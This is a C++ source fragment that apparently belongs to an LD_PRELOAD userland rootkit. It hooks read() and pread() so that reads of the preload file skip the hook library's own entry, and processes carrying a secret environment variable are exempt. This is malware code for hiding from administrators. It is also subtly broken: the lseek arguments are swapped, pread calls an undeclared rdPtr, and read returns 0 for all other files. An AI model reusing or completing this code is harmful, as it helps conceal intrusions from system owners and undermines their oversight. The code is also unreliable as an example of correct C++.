
#include "main.h"



ssize_t read (int fd, void *buf, size_t count) {
	std::string lnkAim;
	CErrnoSaver serr;
	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
	char *chPtr;
	

	assert (opnPtr != NULL);
	assert (rdPtr != NULL);

	// To check if the caller is our trust process
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
		return rdPtr (fd, buf, count);
	}
	
	lnkAim = readLinkName (("/proc/self/fd/" + intToString (fd)).c_str ());
	
	if (lnkAim == prelFileName) {
		off_t pst = lseek (fd, SEEK_CUR, 0);
		if (pst == -1) {
			serr.set (EBADF);
			return pst;
		}
		
		if (-1 == lseek (fd, SEEK_SET, pst + (hookLibraryName + separator).size ())) {
			serr.set (EBADF);
			return -1;
		}
		return rdPtr (fd, buf, count);
	}
	
	
	return 0;
}

ssize_t pread (int fd, void *buf, size_t count, off_t offset) {
	std::string lnkAim;
	CErrnoSaver serr;
	READ prdPtr = (READ)dlsym (RTLD_NEXT, "pread");
	char *chPtr;
	

	assert (prdPtr != NULL);

	// To check if the caller is our trust process
	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
		return prdPtr (fd, buf, count, offset);
	}
	
	lnkAim = readLinkName (("/proc/self/fd/" + intToString (fd)).c_str ());
	
	if (lnkAim == prelFileName) {
		return rdPtr (fd, buf, count, offset + (hookLibraryName + separator).size ());
	}
	
	
	return prdPtr (fd, buf, count, offset);
}








